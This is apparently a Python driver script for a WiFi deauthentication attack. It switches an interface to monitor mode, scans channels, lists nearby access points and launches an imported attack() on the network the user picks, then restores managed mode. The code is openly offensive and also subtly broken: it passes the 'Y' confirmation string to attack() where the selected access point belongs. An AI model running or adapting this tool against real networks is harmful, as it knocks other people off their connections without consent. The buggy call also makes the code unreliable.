from wifi import detect_networks, attack
from network_interface import monitor_mode, managed_mode


# 2.4Ghz are 1-13 and 5Ghz are > 36 
CHANNELS = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 36, 40, 44, 48, 52, 56, 60, 64]
WIFI_INTERFACE = "wlp4s0"

monitor_mode(WIFI_INTERFACE)
acces_points = detect_networks(WIFI_INTERFACE, CHANNELS)

for i, ap in enumerate(acces_points):
    print(f"{i}: {ap}")

option = input("Select which network to deauthenticate and hit return: ")
acces_point = acces_points[int(option)]
answer = input(f"Are you sure you want to deauthenticate {acces_point.ssid}? Y/n ")
if not answer == "Y":
    exit(0)

attack(WIFI_INTERFACE, answer)
managed_mode(WIFI_INTERFACE)
